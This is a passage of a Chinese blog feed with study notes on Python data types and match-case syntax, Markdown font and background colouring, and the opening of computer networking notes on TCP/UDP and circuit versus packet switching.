class="string">3.14</span></span><br></pre></td></tr></table></figure><blockquote><p>其他序列类型也可以实现打包和解包</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a,b,c,d,e=<span class="string">&quot;FishC&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;c</span></span><br><span class="line"><span class="string">&#x27;s&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">a,b,*c=&quot;</span>FishC<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;c</span></span><br><span class="line"><span class="string">[&#x27;</span>s<span class="string">&#x27;,&#x27;</span>h<span class="string">&#x27;,&#x27;</span>C<span class="string">&#x27;]</span></span><br></pre></td></tr></table></figure><h3 id="Set（集合）"><a href="#Set（集合）" class="headerlink" title="Set（集合）"></a>Set（集合）</h3><p>集合（set）是由一个或数个形态各异的大小整体组成的，构成集合的事物或对象称作元素或是成员。</p><p>基本功能是进行成员关系测试和删除重复元素。</p><p>可以使用大括号 { } 或者 set() 函数创建集合，注意：创建一个空集合必须用 set() 而不是 { }，因为 { } 是用来创建一个空字典。</p><p>创建格式：</p><ul><li>parame &#x3D; {value01,value02,…}</li><li>set(value)</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line">sites = &#123;<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Taobao&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>, <span class="string">&#x27;Facebook&#x27;</span>, <span class="string">&#x27;Zhihu&#x27;</span>, <span class="string">&#x27;Baidu&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sites)   <span class="comment"># 输出集合，重复的元素被自动去掉</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 成员测试</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;Runoob&#x27;</span> <span class="keyword">in</span> sites :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Runoob 在集合中&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Runoob 不在集合中&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># set可以进行集合运算</span></span><br><span class="line">a = <span class="built_in">set</span>(<span class="string">&#x27;abracadabra&#x27;</span>)</span><br><span class="line">b = <span class="built_in">set</span>(<span class="string">&#x27;alacazam&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a - b)     <span class="comment"># a 和 b 的差集</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a | b)     <span class="comment"># a 和 b 的并集</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a &amp; b)     <span class="comment"># a 和 b 的交集</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a ^ b)     <span class="comment"># a 和 b 中不同时存在的元素</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;<span class="string">&#x27;Zhihu&#x27;</span>, <span class="string">&#x27;Baidu&#x27;</span>, <span class="string">&#x27;Taobao&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>, <span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Facebook&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Runoob 在集合中</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;d&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;<span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;d&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;d&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;a&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;<span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;d&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="Dictionary（字典）"><a href="#Dictionary（字典）" class="headerlink" title="Dictionary（字典）"></a>Dictionary（字典）</h3><p>字典（dictionary）是Python中另一个非常有用的内置数据类型。</p><p>列表是有序的对象集合，字典是无序的对象集合。两者之间的区别在于：字典当中的元素是通过键来存取的，而不是通过偏移存取。</p><p>字典是一种映射类型，字典用 { } 标识，它是一个 <em><strong>无序的 键(key) : 值(value)</strong></em> 的集合。</p><p>键(key)必须使用不可变类型。</p><p>在同一个字典中，键(key)必须是唯一的。 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">dict</span> = &#123;&#125;</span><br><span class="line"><span class="built_in">dict</span>[<span class="string">&#x27;one&#x27;</span>] = <span class="string">&quot;1 - 菜鸟教程&quot;</span></span><br><span class="line"><span class="built_in">dict</span>[<span class="number">2</span>]     = <span class="string">&quot;2 - 菜鸟工具&quot;</span></span><br><span class="line"></span><br><span class="line">tinydict = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;runoob&#x27;</span>,<span class="string">&#x27;code&#x27;</span>:<span class="number">1</span>, <span class="string">&#x27;site&#x27;</span>: <span class="string">&#x27;www.runoob.com&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">dict</span>[<span class="string">&#x27;one&#x27;</span>])       <span class="comment"># 输出键为 &#x27;one&#x27; 的值</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">dict</span>[<span class="number">2</span>])           <span class="comment"># 输出键为 2 的值</span></span><br><span class="line"><span class="built_in">print</span> (tinydict)          <span class="comment"># 输出完整的字典</span></span><br><span class="line"><span class="built_in">print</span> (tinydict.keys())   <span class="comment"># 输出所有键</span></span><br><span class="line"><span class="built_in">print</span> (tinydict.values()) <span class="comment"># 输出所有值</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1</span> - 菜鸟教程</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">2</span> - 菜鸟工具</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;runoob&#x27;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;site&#x27;</span>: <span class="string">&#x27;www.runoob.com&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dict_keys([<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;site&#x27;</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dict_values([<span class="string">&#x27;runoob&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;www.runoob.com&#x27;</span>])</span><br></pre></td></tr></table></figure><blockquote><p>注意：</p><p>   1、字典是一种映射类型，它的元素是键值对。<br>   2、字典的关键字必须为不可变类型，且不能重复。<br>   3、创建空字典使用 { }。</p></blockquote><h3 id="Python数据类型转换"><a href="#Python数据类型转换" class="headerlink" title="Python数据类型转换"></a>Python数据类型转换</h3><p>以下几个内置的函数可以执行数据类型之间的转换。这些函数返回一个新的对象，表示转换的值。</p><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>int(x [,base])</td><td>将x转换为一个整数</td></tr><tr><td>float(x)</td><td>将x转换到一个浮点数</td></tr><tr><td>complex(real [,imag])</td><td>创建一个复数</td></tr><tr><td>str(x)</td><td>将对象 x 转换为字符串</td></tr><tr><td>repr(x)</td><td>将对象 x 转换为表达式字符串</td></tr><tr><td>eval(str)</td><td>用来计算在字符串中的有效Python表达式,并返回一个对象</td></tr><tr><td>tuple(s)</td><td>将序列 s 转换为一个元组</td></tr><tr><td>list(s)</td><td>将序列 s 转换为一个列表</td></tr><tr><td>set(s)</td><td>转换为可变集合</td></tr><tr><td>dict(d)</td><td>建一个字典。d 必须是一个 (key, value)元组序列。</td></tr><tr><td>frozenset(s)</td><td>转换为不可变集合</td></tr><tr><td>chr(x)</td><td>将一个整数转换为一个字符</td></tr><tr><td>ord(x)</td><td>将一个字符转换为它的整数值</td></tr><tr><td>hex(x)</td><td>将一个整数转换为一个十六进制字符串</td></tr><tr><td>oct(x)</td><td>将一个整数转换为一个八进制字符串</td></tr></tbody></table><h3 id="Python成员运算符-amp-身份运算符"><a href="#Python成员运算符-amp-身份运算符" class="headerlink" title="Python成员运算符&amp;身份运算符"></a>Python成员运算符&amp;身份运算符</h3><p>除了以上的一些运算符之外，Python还支持成员运算符，测试实例中包含了一系列的成员，包括字符串，列表或元组。</p><table><thead><tr><th>运算符</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>in</td><td>如果在指定的序列中找到值返回 True，否则返回 False。</td><td>x 在 y 序列中 , 如果 x 在 y 序列中返回 True。</td></tr><tr><td>not in</td><td>如果在指定的序列中没有找到值返回 True，否则返回 False。</td><td>x 不在 y 序列中 , 如果 x 不在 y 序列中返回 True。</td></tr></tbody></table><p>身份运算符用于比较两个对象的存储单元</p><table><thead><tr><th>运算符</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>is</td><td>is 是判断两个标识符是不是引用自一个对象</td><td>x is y, 类似 id(x) &#x3D;&#x3D; id(y) , 如果引用的是同一个对象则返回 True，否则返回 False</td></tr><tr><td>is not</td><td>is not 是判断两个标识符是不是引用自不同对象</td><td>x is not y ， 类似 id(x) !&#x3D; id(y)。如果引用的不是同一个对象则返回结果 True，否则返回 False。</td></tr></tbody></table><h1 id="条件控制"><a href="#条件控制" class="headerlink" title="条件控制"></a>条件控制</h1><p>Python 中用<strong>elif</strong>代替了 else if，所以if语句的关键字为：<strong>if – elif – else</strong>。</p><blockquote><p>注意：</p><p>   1、每个条件后面要使用冒号 :，表示接下来是满足条件后要执行的语句块。</p><p>   2、使用缩进来划分语句块，相同缩进数的语句在一起组成一个语句块。</p><p>   3、在 Python 中没有 switch…case 语句，但在 Python3.10 版本添加了 match…case，功能也类似。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mystatus=<span class="number">400</span></span><br><span class="line"><span class="built_in">print</span>(http_error(<span class="number">400</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">http_error</span>(<span class="params">status</span>):</span><br><span class="line">    match status:</span><br><span class="line">        case <span class="number">400</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Bad request&quot;</span></span><br><span class="line">        case <span class="number">404</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Not found&quot;</span></span><br><span class="line">        case <span class="number">418</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;I&#x27;m a teapot&quot;</span></span><br><span class="line">        case _:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Something&#x27;s wrong with the internet&quot;</span></span><br></pre></td></tr></table></figure><p>一个 case 也可以设置多个匹配条件，条件使用 ｜ 隔开，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    case <span class="number">401</span>|<span class="number">403</span>|<span class="number">404</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Not allowed&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MarkDown语法(二)</title>
      <link href="/post/a1b131e4.html"/>
      <url>/post/a1b131e4.html</url>
      
        <content type="html"><![CDATA[<h1 id="一、更改字体、颜色、大小"><a href="#一、更改字体、颜色、大小" class="headerlink" title="一、更改字体、颜色、大小"></a>一、更改字体、颜色、大小</h1><h2 id="1、Markdown语法"><a href="#1、Markdown语法" class="headerlink" title="1、Markdown语法"></a>1、Markdown语法</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">face</span>=<span class="string">&quot;黑体&quot;</span>&gt;</span></span>黑体字<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">face</span>=<span class="string">&quot;微软雅黑&quot;</span>&gt;</span></span>微软雅黑<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">face</span>=<span class="string">&quot;STCAIYUN&quot;</span>&gt;</span></span>华文彩云<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">blue</span>&gt;</span></span>蓝色<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">#008000</span>&gt;</span></span>绿色<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">Red</span>&gt;</span></span>红色<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">5</span>&gt;</span></span>尺寸<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><em><strong>效果如下</strong></em></p><p><font face="黑体">黑体字</font></p><p><font face="微软雅黑">微软雅黑</font></p><p><font face="STCAIYUN">华文彩云</font></p><p><font color=blue>蓝色</font></p><p><font color=#008000>绿色</font></p><p><font color=Red>红色</font></p><p><font size=5>尺寸</font></p><h2 id="2、一些常用颜色"><a href="#2、一些常用颜色" class="headerlink" title="2、一些常用颜色"></a>2、一些常用颜色</h2><p><font color=NavajoWhite>color&#x3D;NavajoWhite</font></p><p><font color=Feldspar>color&#x3D;Feldspar</font></p><p><font color=SandyBrown>color&#x3D;SandyBrown</font></p><p><font color=LightSalmon>color&#x3D;LightSalmon</font></p><p><font color=Pink>color&#x3D;Pink</font></p><p><font color=PaleVioletRed>color&#x3D;PaleVioletRed</font></p><p><font color=HotPink>color&#x3D;HotPink</font></p><h2 id="3-文字底色"><a href="#3-文字底色" class="headerlink" title="3.文字底色"></a>3.文字底色</h2><p>借助 table, tr, td 等表格标签的 bgcolor 属性来实现背景色。将那一整行看作一个表格，更改整个格子的背景色（bgcolor）</p><p>Markdown语法:</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">td</span> <span class="attr">bgcolor</span>=<span class="string">DarkSeaGreen</span>&gt;</span></span>这里的背景色是：DarkSeaGreen，此处输入任意想输入的内容<span class="language-xml"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>效果：</p><table><tr><td bgcolor=DarkSeaGreen>这里的背景色是：DarkSeaGreen，此处输入任意想输入的内容</td></tr></table><table><tr><td bgcolor=Beige>这里的背景色是：Beige，此处输入任意想输入的内容</td></tr></table><table><tr><td bgcolor=MistyRose>这里的背景色是：MistyRose，此处输入任意想输入的内容</td></tr></table>]]></content>
      
      
      <categories>
          
          <category> MarkDown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MarkDown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机通信与网络</title>
      <link href="/post/7da59eac.html"/>
      <url>/post/7da59eac.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>参考资料：<a href="https://cnhuazhu.gitee.io/2021/03/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/">花猪のBlog</a></p><p>《计算机网络（自顶向下方法 第7版，James F.Kurose，Keith W.Ross）》</p></blockquote><h1 id="第一章：计算机网络概述"><a href="#第一章：计算机网络概述" class="headerlink" title="第一章：计算机网络概述"></a>第一章：计算机网络概述</h1><p>为了更好的理解<font color=HotPink>Internet（互联网）</font>这个概念，先从简单的<font color=HotPink>网络</font>概念说起：通俗的理解网络，就是由许多<strong>节点</strong>和<strong>边</strong>组成的系统。当我们把这些节点和边具象化之后，计算机网络以及Internet的概念就更容易理解了。</p><h2 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h2><p>通俗的解释计算机网络的概念：<strong>联网的计算机所构成的系统。</strong></p><p>其“节点”分为两类：分别为<strong>主机节点</strong>以及<strong>数据交换节点</strong>。</p><ul><li><p>主机节点： 主机及其上运行的应用程序（是数据的源或目标）。</p><p>  举例：ipad、手机、智能冰箱…</p></li><li><p>数据交换节点： 路由器、交换机等网络交换设备（既不是数据的源也不是目标，而是数据的中转节点）。</p></li></ul><p>其“边”（通信链路）同样分为两类：分别为接入网链路以及主干链路。其作用是将各个节点连接在一起。</p><ul><li>接入网链路：主机连接到互联网的链路。</li><li>主干链路：路由器之间的链路。</li></ul><p>仅仅依靠所谓的“节点”和“边”是无法进行互联网间的通信的，还有一个要素就是协议。</p><ul><li>协议（protocol）：定义了在两个或多个通信实体之间交换的报文的格式和顺序，以及报文发送和&#x2F;或接收一条报文或其他事件所采取的动作。</li></ul><p>Internet 中所有的通信行为都受协议制约。</p><p>至此我们可以大致理解计算机网络的概念。</p><h2 id="Internet（互联网）"><a href="#Internet（互联网）" class="headerlink" title="Internet（互联网）"></a>Internet（互联网）</h2><p>以TCP&#x2F;IP协议为主的一簇协议，由该协议支撑起的计算机网络。</p><p>我们可以从两方面理解到底何为Internet：一个方面是从Internet的具体构成角度（即上文所提），另一方面是从服务的角度来理解。</p><h3 id="从具体构成的角度"><a href="#从具体构成的角度" class="headerlink" title="从具体构成的角度"></a>从具体构成的角度</h3><ul><li><p>数以亿计的、互联的计算设备，具体包括：</p><p>  主机（host）&#x3D; 端系统（end system）</p><p>  在操作系统中驻留的网络应用程序</p></li><li><p>通信链路</p><p>  举例：光纤、同轴电缆、无线电、卫星</p><p>  传输速率 &#x3D; 带宽（bps）</p></li></ul><blockquote><pre><code>  注意区分：      存储常用字节Byte：K/M/G层级为2^10进制      传输常用比特Bit：K/M/G层级为10^3进制</code></pre></blockquote><ul><li><p>分组交换设备：转发分组（packets）。</p><p>  举例：路由器、交换机…</p></li><li><p>协议：控制发送、接收消息。</p><p>  举例：TCP、IP、HTTP、FTP、PPP…</p></li><li><p>Internet标准：</p><p>  RFC（Request for comments）：请求评述</p><p>  IETF（Internet Engineering Task Force）：互联网工程任务组</p></li><li><p>Internet即“网络的网络”</p></li></ul><blockquote><pre><code>  理解：     很多网络通过网络互联设备连接在一起     网络之下还包括很多小网络     小网络之间也可以任意互联</code></pre></blockquote><h3 id="从服务的角度"><a href="#从服务的角度" class="headerlink" title="从服务的角度"></a>从服务的角度</h3><p><strong>分布式的应用进程</strong>以及为分布式应用进程提供通讯服务的<strong>基础设施</strong>。</p><blockquote><p>基础设施：包括主机以及应用层以下的所有协议实体。</p></blockquote><ul><li><p>使用通信设施进行通信的分布式应用</p><p>  举例：Web、VoIP、email、分布式游戏、电子商务、社交网络…</p></li><li><p>通信基础设施为apps提供编程接口（通信服务）：将发送和接收数据的apps与互联网连接起来。</p></li></ul><blockquote><pre><code>   通信服务分为两种：       面向连接的服务：以TCP/IP协议向应用进程提供服务的形式。       无连接的服务：以UDP协议向应用进程提供服务的形式。</code></pre></blockquote><h2 id="网络结构"><a href="#网络结构" class="headerlink" title="网络结构"></a>网络结构</h2><p>网络结构主要由三个部分组成：网络边缘（Edge）、网络核心（Core）、接入网（Acess）\物理媒体</p><ul><li>网络边缘：包括应用进程（程序）以及为其提供硬件基础服务的主机。边缘上运行的网络应用是网络存在理由。</li><li>网络核心：包括网络交换节点（路由）以及节点间的通信链路。边缘主机只有通过接入网连接到网络核心才可以实现相互间的信息传递。</li><li>接入网：有线或无线的通信链路。其作用是将边缘的主机系统接入到网络核心中去。</li></ul><h3 id="网络边缘"><a href="#网络边缘" class="headerlink" title="网络边缘"></a>网络边缘</h3><p>网络边缘就是端系统（主机），包括网络应用（如：Web、Email）和支持网络应用的硬件设备。应用进程可以说是整个网络系统存在的理由，其中不同边缘的应用进程通过网络进行数据交换。</p><p>应用进程间的通讯模式有两种：</p><ol><li>C&#x2F;S模式（客户端&#x2F;服务器）：有着明确的客户端以及服务器。其特点也是该模式比较致命的问题：扩展性差。一个服务器的请求载荷是有限的，随着客户端的请求载荷增加，服务器的压力会越来越大，处理能力就会逐渐下降。一旦请求载荷超过某一个阈值时，服务器的处理能力就会出现断崖式下跌。目前的解决方式就是增加服务器的部署。</li><li>P2P模式（peer-peer）：没有明确的客户端或者服务器的界限。每一个分布式的应用进程既可以是客户端，又可以是服务器。这样的模式可以很好地解决C&#x2F;S模式中扩展性差的问题，因为随着请求服务的节点增加，从某种意义上来说提供服务的节点也在相应地增加。（实例：迅雷、BitTorrenth）</li></ol><p>基础设施为网络应用提供的服务有两种方式：</p><blockquote><pre><code>   理解基础设施的概念：在网络应用（应用进程）下层的所有内容，包括主机、接入网、网络核心等，都统一理解为基础设施。   两种服务方式的目的都是在端系统之间传输数据。</code></pre></blockquote><h4 id="面向连接的通信方式："><a href="#面向连接的通信方式：" class="headerlink" title="面向连接的通信方式："></a>面向连接的通信方式：</h4><pre><code>代表：TCP服务（Transmission Control Protocol，传输控制协议）有握手：目的是两个通信主机间为连接建立状态，有一个数据传输前的准备的过程。</code></pre><p>特性：</p><ul><li>可靠地、按顺序地传送数据：不同端系统间的通信归根到底都是数据通过底层的物理信道进行传输，如何保证物理信息在传输时准确，TCP服务给予保证。</li><li>流量控制：在信息传输时存在这样一种情况，即服务器的能力很强，可以高速地发送大量数据，但是信息接收方（客户端）接收、处理信息的能力很弱，二者的速度不匹配，信息传输就容易造成错误。TCP协议实体可以发送反馈，从而协调好发送方和接收方的速度，致使发送方不会淹没接收方。</li><li>拥塞控制：信息传输时还有一种情况：信息发送和接收双方的能力都很强，但是网络核心中的传输信道发生拥塞，如果此时发送方仍然不断地向外大量发送数据，很可能造成数据的丢失。TCP协议就可以根据情况判断，当网络拥塞时，控制发送方降低信息发送速率。</li></ul><p>使用TCP的应用： HTTP (Web)、FTP (文件传送)、Telnet (远程登录)、SMTP（email）</p><h4 id="无连接服务："><a href="#无连接服务：" class="headerlink" title="无连接服务："></a>无连接服务：</h4><pre><code>代表：UDP服务（User Datagram Protocol，用户数据报协议）无握手：直接传输数据，没有传输前的准备过程。</code></pre><p>特性：</p><ul><li><pre><code>   数据传输不可靠</code></pre></li><li><pre><code>   无流量控制</code></pre></li><li><pre><code>   无拥塞控制</code></pre></li></ul><p>UDP服务不能保证信息传输的准确性，但是它的存在也具有价值。一些实时流媒体应用对于数据传输的延迟是无法接受的，UDP服务正是省去了信息传输的很多步骤从而保证了信息传输的速度。</p><p>使用UDP的应用：流媒体、远程会议、DNS、Internet电话</p><h3 id="网络核心"><a href="#网络核心" class="headerlink" title="网络核心"></a>网络核心</h3><p>网络核心由数据交换节点和其间的通信链路组成。</p><p>网络核心的主要功能是：</p><ul><li>路由：决定分组采用的源主机到目标主机的路径（全局）</li><li>转发：将分组从路由器的输入链路转移到输出链路（局部）</li></ul><p>通信网络大致可以按照如下方式分类：</p><ol><li>电路交换网络</li></ol><p>端到端的资源被分配给从源端到目标端的呼叫（建立起一条专有链路）。</p><p>电路交换网络的特点是<strong>资源独享</strong>，即便主机间建立连接后无数据传输，也会占用线路资源，从而使其他用户无法使用，导致资源浪费。但是这种连接方式保证了性能，多用于传统电话网络，而<strong>不适用计算机间的连接</strong>。</p><blockquote><p>  计算机之间的通信不像电话，它具有很强的突发性，两台主机建立连接后并不是时时刻刻都在进行数据传输。（如浏览网页，用户发起请求之后的很长一部分时间都在进行页面浏览，此时并没有数据传输）</p></blockquote><p>为了提高电路交换网络的使用效率，网络资源（如带宽）被分成“片段”，同时被多位用户使用。像这样分成片段的方式主要有：</p><ul><li>频分（Frequency-division multiplexing）</li><li>时分（Time-division multiplexing）</li><li>波分（Wave-division multiplexing）</li></ul><p><strong>频分（FDM）</strong>：将带宽分成几个片段，不同的用户使用不同的片段。</p><p><strong>时分（TDM）</strong>：将带宽按周期分为成许多片段，每一个周期再分为几个不同的时隙（slot），每位用户固定使用其中的一个时隙。</p><p><strong>波分（WDM）</strong>：多用于光电路传输，把光信号分成不同波段，分给不同用户使用。</p><ol start="2"><li>分组交换网络</li></ol><p>将要传输的数据分成一个个的单位：分组&#x2F;包（packet）</p><p>与电路交换网络不同，采用分组交换网路通信时，数据传输会占用通信链路的全部带宽。</p><p>主机间的数据传输过程如图：转发节点接收前一个节点传来的分组，并存储起来，等分组的全部传输完成之后，再将数据传输给下一个节点。（存储-转发）</p><blockquote><p>   需要注意的是：每一个节点都必须接收分组的全部之后才能向后传递。如果边接收分组，边向后传输，就会造成多段通信链路全部处于占用状态，致使其他用户无法使用。分组也就失去了意义。</p></blockquote><blockquote><p>   例子：如图，长度为L &#x3D; 7.5Mbits的分组，在一个速率为R &#x3D; 1.5Mbps的链路中传输，三次存储-转发的延时为3 × (7.5 &#x2F; 1.5)s &#x3D; 15s.</p></blockquote><p>分组交换网络的<strong>优势</strong>就是：按需使用。即有需要时才占用网络资源。</p><p>但是这较于电路交换网络的延迟会高很多，延迟的具体组成分为两部分：</p><ul><li>节点对分组进行存储</li><li>排队时间</li></ul><blockquote><p>   分组交换的排队延迟和丢失：</p><p>   当转发节点的<strong>数据到达速率&gt;链路的输出速率</strong>时，分组将会进行排队，如果路由器的缓存用尽，分组将会丢失。</p><p>   为了保证数据可靠地传输，就需要协议来约束：拥塞控制</p></blockquote><p>了解了分组交换网络的数据传输原理，就可以引出<strong>统计时分多路复用（statistical time division 